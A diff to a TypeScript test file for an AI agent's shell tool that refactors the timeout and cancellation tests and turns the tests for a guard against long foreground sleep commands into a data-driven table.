+      const result = await runTimed({ output: 'x'.repeat(40_000) });
+
+      expect(result.llmContent).toContain('/tmp/tool-output.txt');
+      expect(shellResultText(result.returnDisplay)).toContain(
+        '/tmp/tool-output.txt',
+      );
+      expect(result.error).toEqual({
+        message: TIMED_OUT,
+        type: ToolErrorType.EXECUTION_TIMEOUT,
       });
-
-      try {
-        const promise = invocation.execute(new AbortController().signal);
-        resolveExecutionPromise({
-          rawOutput: Buffer.from('x'.repeat(40_000)),
-          output: 'x'.repeat(40_000),
-          exitCode: null,
-          signal: null,
-          error: null,
-          aborted: true,
-          pid: 12345,
-          executionMethod: 'child_process',
-        });
-        const result = await promise;
-
-        expect(result.llmContent).toContain('/tmp/tool-output.txt');
-        expect(result.returnDisplay).toContain('/tmp/tool-output.txt');
-        expect(result.error).toEqual({
-          message: 'Command timed out after 5000ms before it could complete.',
-          type: ToolErrorType.EXECUTION_TIMEOUT,
-        });
-      } finally {
-        vi.stubGlobal('AbortSignal', originalAbortSignal);
-        truncationSpy.mockRestore();
-      }
     });
 
     it('keeps the first user cancellation after a later timeout', async () => {
       const userAbortController = new AbortController();
-      const invocation = shellTool.build({
-        command: 'long-running-command',
-        is_background: false,
-        timeout: 5000,
-      });
-      const mockCombinedSignal = {
-        aborted: true,
-        reason: new DOMException('cancelled', 'AbortError'),
-        addEventListener: vi.fn(),
-        removeEventListener: vi.fn(),
-      } as unknown as AbortSignal;
-      const originalAbortSignal = globalThis.AbortSignal;
-      vi.stubGlobal('AbortSignal', {
-        ...originalAbortSignal,
-        timeout: vi.fn().mockReturnValue({ aborted: true }),
-        any: vi.fn().mockReturnValue(mockCombinedSignal),
-      });
+      stubAbortSignal(
+        { aborted: true },
+        fakeSignal(true, new DOMException('cancelled', 'AbortError')),
+      );
 
-      try {
-        const promise = invocation.execute(userAbortController.signal);
-        userAbortController.abort();
-        resolveExecutionPromise({
-          rawOutput: Buffer.alloc(0),
-          output: '',
-          exitCode: null,
-          signal: null,
-          error: null,
-          aborted: true,
-          pid: 12345,
-          executionMethod: 'child_process',
-        });
-        const result = await promise;
-        expect(result.llmContent).toContain('cancelled by user');
-        expect(result.error).toBeUndefined();
-      } finally {
-        vi.stubGlobal('AbortSignal', originalAbortSignal);
-      }
+      const result = await runTimed(
+        {},
+        {
+          signal: userAbortController.signal,
+          beforeSettle: () => userAbortController.abort(),
+        },
+      );
+      expect(result.llmContent).toContain('cancelled by user');
+      expect(result.error).toBeUndefined();
     });
 
     it('should use default timeout behavior when timeout is not specified', async () => {
-      const mockAbortSignal = new AbortController().signal;
-      const invocation = shellTool.build({
-        command: 'echo test',
-        is_background: false,
-      });
-
-      const promise = invocation.execute(mockAbortSignal);
-
-      resolveExecutionPromise({
-        rawOutput: Buffer.from('test'),
-        output: 'test',
-        exitCode: 0,
-        signal: null,
-        error: null,
-        aborted: false,
-        pid: 12345,
-        executionMethod: 'child_process',
-      });
-
+      const promise = build('echo test').execute(new AbortController().signal);
+      resolveExecutionPromise(shellResult({ output: 'test' }));
       await promise;
 
       // Should create a combined signal with the default timeout when no timeout is specified
-      expect(mockShellExecutionService).toHaveBeenCalledWith(
-        expect.any(String),
-        expect.any(String),
-        expect.any(Function),
-        expect.any(AbortSignal),
-        false,
-        expect.objectContaining({}),
-
-        expect.objectContaining({ postPromote: expect.any(Object) }),
-      );
+      expectSpawned(expect.any(String));
     });
   });
 });
@@ -9313,182 +5294,156 @@ describe('parseNumstat', () => {
 });
 
 describe('detectBlockedSleepPattern', () => {
-  it('blocks standalone sleep >= 2s', () => {
-    expect(detectBlockedSleepPattern('sleep 5')).toBe('standalone sleep 5');
-    expect(detectBlockedSleepPattern('sleep 10')).toBe('standalone sleep 10');
-    expect(detectBlockedSleepPattern('sleep 2.5')).toBe('standalone sleep 2.5');
-    expect(detectBlockedSleepPattern('sleep 2s')).toBe('standalone sleep 2s');
-    expect(detectBlockedSleepPattern('sleep 2000ms')).toBe(
-      'standalone sleep 2000ms',
-    );
-    expect(detectBlockedSleepPattern('sleep 3m')).toBe('standalone sleep 3m');
-  });
-
-  it('blocks sleep followed by another command', () => {
-    expect(detectBlockedSleepPattern('sleep 5 && curl http://localhost')).toBe(
-      'sleep 5 followed by: curl http://localhost',
-    );
-    expect(detectBlockedSleepPattern('sleep 3; echo done')).toBe(
-      'sleep 3 followed by: echo done',
-    );
-    expect(detectBlockedSleepPattern('sleep 2.5 || echo done')).toBe(
-      'sleep 2.5 followed by: echo done',
-    );
-    expect(detectBlockedSleepPattern('sleep 2s\necho done')).toBe(
-      'sleep 2s followed by: echo done',
-    );
-  });
-
-  it('allows sleep < 2s', () => {
-    expect(detectBlockedSleepPattern('sleep 1')).toBeNull();
-    expect(detectBlockedSleepPattern('sleep 0')).toBeNull();
-  });
-
-  it('allows sleep durations below 2 seconds', () => {
-    expect(detectBlockedSleepPattern('sleep 0.5')).toBeNull();
-    expect(detectBlockedSleepPattern('sleep 1.5')).toBeNull();
-    expect(detectBlockedSleepPattern('sleep 1500ms')).toBeNull();
-  });
-
-  it('allows sleep not as first subcommand', () => {
-    expect(detectBlockedSleepPattern('echo hello && sleep 5')).toBeNull();
-  });
-
-  it('allows non-sleep commands', () => {
-    expect(detectBlockedSleepPattern('cat file.txt')).toBeNull();
-    expect(detectBlockedSleepPattern('npm run dev')).toBeNull();
-  });
-
-  it('allows sleep in pipelines', () => {
-    expect(detectBlockedSleepPattern('sleep 5 | cat')).toBeNull();
-    expect(
-      detectBlockedSleepPattern(
-        'sleep 10 | while read line; do echo $line; done',
-      ),
-    ).toBeNull();
-  });
-
-  it('allows backgrounded sleep (bare &)', () => {
-    expect(detectBlockedSleepPattern('sleep 5 & echo done')).toBeNull();
-    expect(detectBlockedSleepPattern('sleep 10 & wait')).toBeNull();
-  });
-
-  it('returns null for empty command', () => {
-    expect(detectBlockedSleepPattern('')).toBeNull();
-  });
-
-  it('blocks sleep followed by a top-level shell comment', () => {
+  const STANDALONE_5 = 'standalone sleep 5';
+  const THEN_ECHO_OK = 'sleep 5 followed by: echo ok';
+  it.each<[string, Array<[command: string, expected: string | null]>]>([
+    [
+      'blocks standalone sleep >= 2s',
+      [
+        ['sleep 5', STANDALONE_5],
+        ['sleep 10', 'standalone sleep 10'],
+        ['sleep 2.5', 'standalone sleep 2.5'],
+        ['sleep 2s', 'standalone sleep 2s'],
+        ['sleep 2000ms', 'standalone sleep 2000ms'],
+        ['sleep 3m', 'standalone sleep 3m'],
+      ],
+    ],
+    [
+      'blocks sleep followed by another command',
+      [
+        [
+          'sleep 5 && curl http://localhost',
+          'sleep 5 followed by: curl http://localhost',
+        ],
+        ['sleep 3; echo done', 'sleep 3 followed by: echo done'],
+        ['sleep 2.5 || echo done', 'sleep 2.5 followed by: echo done'],
+        ['sleep 2s\necho done', 'sleep 2s followed by: echo done'],
+      ],
+    ],
+    [
+      'allows sleep < 2s',
+      [
+        ['sleep 1', null],
+        ['sleep 0', null],
+      ],
+    ],
+    [
+      'allows sleep durations below 2 seconds',
+      [
+        ['sleep 0.5', null],
+        ['sleep 1.5', null],
+        ['sleep 1500ms', null],
+      ],
+    ],
+    ['allows sleep not as first subcommand', [['echo hello && sleep 5', null]]],
+    [
+      'allows non-sleep commands',
+      [
+        ['cat file.txt', null],
+        ['npm run dev', null],
+      ],
+    ],
+    [
+      'allows sleep in pipelines',
+      [
+        ['sleep 5 | cat', null],
+        ['sleep 10 | while read line; do echo $line; done', null],
+      ],
+    ],
+    [
+      'allows backgrounded sleep (bare &)',
+      [
+        ['sleep 5 & echo done', null],
+        ['sleep 10 & wait', null],
+      ],
+    ],
+    ['returns null for empty command', [['', null]]],
     // Shell ignores trailing comments, so these are equivalent to
     // standalone foreground sleeps unless they use the explicit
     // intentional-sleep escape hatch.
-    expect(detectBlockedSleepPattern('sleep 5 # wait')).toBe(
-      'standalone sleep 5',
-    );
-    expect(detectBlockedSleepPattern('sleep 5  #wait')).toBe(
-      'standalone sleep 5',
-    );
-    expect(detectBlockedSleepPattern('sleep 2s   # comment')).toBe(
-      'standalone sleep 2s',
-    );
-    expect(detectBlockedSleepPattern('sleep 5 && echo ok # trailing')).toBe(
-      'sleep 5 followed by: echo ok',
-    );
-  });
-
-  it('allows standalone sleep with an intentional sleep comment', () => {
-    expect(
-      detectBlockedSleepPattern(
-        'sleep 5 # intentional-sleep: wait for MCP rate limit reset',
-      ),
-    ).toBeNull();
-    expect(
-      detectBlockedSleepPattern(
-        'sleep 2s # intentional-sleep: deliberate rate limit backoff',
-      ),
-    ).toBeNull();
-    expect(
-      detectBlockedSleepPattern(
-        'sleep 10m # intentional-sleep: wait for MCP rate limit reset',
-      ),
-    ).toBeNull();
-  });
-
-  it('requires a meaningful intentional sleep reason', () => {
-    expect(detectBlockedSleepPattern('sleep 5 # intentional-sleep:')).toBe(
-      'standalone sleep 5',
-    );
-    expect(detectBlockedSleepPattern('sleep 5 # intentional-sleep: wait')).toBe(
-      'standalone sleep 5',
-    );
-    expect(
-      detectBlockedSleepPattern('sleep 5 # intentional-sleep: 1234567'),
-    ).toBe('standalone sleep 5');
-    expect(
-      detectBlockedSleepPattern('sleep 5 # intentional-sleep: 12345678'),
-    ).toBeNull();
-  });
-
-  it('blocks intentional sleep comments above the duration cap', () => {
-    expect(
-      detectBlockedSleepPattern(
-        'sleep 601s # intentional-sleep: wait for MCP rate limit reset',
-      ),
-    ).toBe('standalone sleep 601s');
-  });
-
-  it('does not allow intentional sleep comments on leading sleep chains', () => {
-    expect(
-      detectBlockedSleepPattern(
-        'sleep 5 && echo ok # intentional-sleep: wait for rate limit reset',
-      ),
-    ).toBe('sleep 5 followed by: echo ok');
-  });
-
-  it('does not allow intentional sleep comments to hide newline commands', () => {
-    expect(
-      detectBlockedSleepPattern(
-        'sleep 5 # intentional-sleep: wait for rate limit reset\necho ok',
-      ),
-    ).toBe('sleep 5 followed by: echo ok');
-  });
-
-  it('preserves commands after a shell comment newline', () => {
-    expect(detectBlockedSleepPattern('sleep 5 # wait\necho ok')).toBe(
-      'sleep 5 followed by: echo ok',
-    );
-  });
-
-  it('does not treat in-quoted `#` as a comment', () => {
+    [
+      'blocks sleep followed by a top-level shell comment',
+      [
+        ['sleep 5 # wait', STANDALONE_5],
+        ['sleep 5  #wait', STANDALONE_5],
+        ['sleep 2s   # comment', 'standalone sleep 2s'],
+        ['sleep 5 && echo ok # trailing', THEN_ECHO_OK],
+      ],
+    ],
+    [
+      'allows standalone sleep with an intentional sleep comment',
+      [
+        ['sleep 5 # intentional-sleep: wait for MCP rate limit reset', null],
+        ['sleep 2s # intentional-sleep: deliberate rate limit backoff', null],
+        ['sleep 10m # intentional-sleep: wait for MCP rate limit reset', null],
+      ],
+    ],
+    [
+      'requires a meaningful intentional sleep reason',
+      [
+        ['sleep 5 # intentional-sleep:', STANDALONE_5],
+        ['sleep 5 # intentional-sleep: wait', STANDALONE_5],
+        ['sleep 5 # intentional-sleep: 1234567', STANDALONE_5],
+        ['sleep 5 # intentional-sleep: 12345678', null],
+      ],
+    ],
+    [
+      'blocks intentional sleep comments above the duration cap',
+      [
+        [
+          'sleep 601s # intentional-sleep: wait for MCP rate limit reset',
+          'standalone sleep 601s',
+        ],
+      ],
+    ],
+    [
+      'does not allow intentional sleep comments on leading sleep chains',
+      [
+        [
+          'sleep 5 && echo ok # intentional-sleep: wait for rate limit reset',
+          THEN_ECHO_OK,
+        ],
+      ],
+    ],
+    [
+      'does not allow intentional sleep comments to hide newline commands',
+      [
+        [
+          'sleep 5 # intentional-sleep: wait for rate limit reset\necho ok',
+          THEN_ECHO_OK,
+        ],
+      ],
+    ],
+    [
+      'preserves commands after a shell comment newline',
+      [['sleep 5 # wait\necho ok', THEN_ECHO_OK]],
+    ],
     // `#` inside single quotes is literal, so the suffix is not a comment
     // and the existing separator logic still rejects it.
-    expect(
-      detectBlockedSleepPattern("sleep 5 'arg # not a comment'"),
-    ).toBeNull();
-  });
-
-  it('blocks wrapped foreground sleep when paired with stripShellWrapper', () => {
+    [
+      'does not treat in-quoted `#` as a comment',
+      [["sleep 5 'arg # not a comment'", null]],
+    ],
     // This mirrors the shell validator call site: the foreground sleep
     // guard runs on `stripShellWrapper(params.command)`, so `bash -c` and
     // sibling wrappers cannot route around the block by hiding the sleep
-    // inside a `-c` script.
-    expect(
-      detectBlockedSleepPattern(stripShellWrapper("bash -c 'sleep 5'")),
-    ).toBe('standalone sleep 5');
-    expect(
-      detectBlockedSleepPattern(stripShellWrapper("sh -c 'sleep 10'")),
-    ).toBe('standalone sleep 10');
-    expect(
-      detectBlockedSleepPattern(stripShellWrapper("zsh -c 'sleep 2s'")),
-    ).toBe('standalone sleep 2s');
-    expect(
-      detectBlockedSleepPattern(
-        stripShellWrapper("bash -c 'sleep 5 && curl http://localhost'"),
-      ),
-    ).toBe('sleep 5 followed by: curl http://localhost');
-
-    // A wrapped sleep < 2s is still allowed.
-    expect(
-      detectBlockedSleepPattern(stripShellWrapper("bash -c 'sleep 1'")),
-    ).toBeNull();
+    // inside a `-c` script. A wrapped sleep < 2s is still allowed.
+    [
+      'blocks wrapped foreground sleep when paired with stripShellWrapper',
+      [
+        [stripShellWrapper("bash -c 'sleep 5'"), STANDALONE_5],
+        [stripShellWrapper("sh -c 'sleep 10'"), 'standalone sleep 10'],
+        [stripShellWrapper("zsh -c 'sleep 2s'"), 'standalone sleep 2s'],
+        [
+          stripShellWrapper("bash -c 'sleep 5 && curl http://localhost'"),
+          'sleep 5 followed by: curl http://localhost',
+        ],
+        [stripShellWrapper("bash -c 'sleep 1'"), null],
+      ],
+    ],
+  ])('%s', (_title, cases) => {
+    for (const [command, expected] of cases) {
+      expect(detectBlockedSleepPattern(command)).toBe(expected);
+    }
   });
 });
